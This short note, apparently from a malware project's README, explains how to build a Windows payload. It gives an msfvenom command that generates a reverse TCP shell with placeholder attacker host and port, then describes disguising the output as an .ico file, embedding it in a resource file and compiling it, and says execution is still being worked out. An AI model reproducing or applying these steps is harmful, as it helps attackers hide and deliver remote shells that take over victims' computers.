Using msfvenom -p windows/64/shell_reverse_tcp LHOST=ipaddres LPORT=port -f raw -o shell generate a payload and save it in a file
and change the file to a .ico file in windows file explorer. Update the resource file with the new payload and compile the file. 
This would generate a reverse shell payload. The code prints the address of the payload and the size of the payload. Still working 
on execution and will update when I find a solution.